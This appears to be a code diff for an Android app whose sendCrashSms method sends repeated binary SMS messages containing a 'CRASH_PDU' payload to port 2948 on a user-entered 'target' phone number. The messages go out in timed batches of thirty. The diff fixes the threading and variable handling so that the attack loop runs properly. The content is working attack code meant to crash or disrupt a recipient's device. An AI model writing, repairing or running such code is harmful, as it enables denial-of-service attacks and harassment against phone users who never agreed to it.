@@ -103,55 +103,55 @@ public class MainActivity extends Activity {
     }
 
     private void sendCrashSms() {
-        String dest = phoneInput.getText().toString().trim();
-        if (dest.isEmpty()) {
-            status.setText("Enter target phone number first.");
-            return;
-        }
-        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-            status.setText("SEND_SMS permission not granted.");
-            return;
-        }
+    String dest = phoneInput.getText().toString().trim();
+    if (dest.isEmpty()) {
+        status.setText("Enter target phone number first.");
+        return;
+    }
+    if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
+        status.setText("SEND_SMS permission not granted.");
+        return;
+    }
 
-        try {
-            SmsManager mgr = getSystemService(SmsManager.class);
-            if (mgr == null) mgr = SmsManager.getDefault();
-            PendingIntent deliveredPI = PendingIntent.getBroadcast(
-                    this, 1,                                    // request code 1 (distinct from sentPI's 0)
-                    new Intent("com.markb.SMS_DELIVERED"),      // separate action for delivery
-                    PendingIntent.FLAG_IMMUTABLE);              // required on modern Android
+    try {
+        SmsManager mgr = getSystemService(SmsManager.class);
+        if (mgr == null) mgr = SmsManager.getDefault();
+        final SmsManager finalMgr = mgr;
 
-          new Thread(() -> {
+        String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
+        status.setText("[" + ts + "] Attempting send to: " + dest + "\n");
+
+        new Thread(() -> {
             for (int batch = 0; batch < 3; batch++) {
                 for (int i = 0; i < 10; i++) {
+                    int reqBase = batch * 10 + i;
+
                     PendingIntent sentPI = PendingIntent.getBroadcast(
-                    this, batch * 10 + i,
-                    new Intent("com.markb.SMS_SENT"),
-                    PendingIntent.FLAG_IMMUTABLE);
+                            this, reqBase,
+                            new Intent("com.markb.SMS_SENT"),
+                            PendingIntent.FLAG_IMMUTABLE);
 
                     PendingIntent deliveredPI = PendingIntent.getBroadcast(
-                    this, 100 + batch * 10 + i,
-                    new Intent("com.markb.SMS_DELIVERED"),
-                    PendingIntent.FLAG_IMMUTABLE);
-                    mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, sentPI, deliveredPI);
+                            this, 100 + reqBase,
+                            new Intent("com.markb.SMS_DELIVERED"),
+                            PendingIntent.FLAG_IMMUTABLE);
+
+                    finalMgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, sentPI, deliveredPI);
+
                     try { Thread.sleep(500); }
                     catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
-        }
+                }
                 if (batch < 2) {
                     try { Thread.sleep(60_000); }
                     catch (InterruptedException e) { Thread.currentThread().interrupt(); return; }
-        }
-    }
-    runOnUiThread(() -> status.append("\nloop done"));
-}).start();          // start the thread
-            
-            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
-            status.setText("[" + ts + "] Attempting send to: " + dest + "\n");
-            
-        } catch (SecurityException e) {
-            status.setText("SecurityException: " + e.getMessage());
-        } catch (Exception e) {
-            status.setText("Send error: " + e.getMessage());
-        }
+                }
+            }
+            runOnUiThread(() -> status.append("\nloop done"));
+        }).start();
+
+    } catch (SecurityException e) {
+        status.setText("SecurityException: " + e.getMessage());
+    } catch (Exception e) {
+        status.setText("Send error: " + e.getMessage());
     }
 }
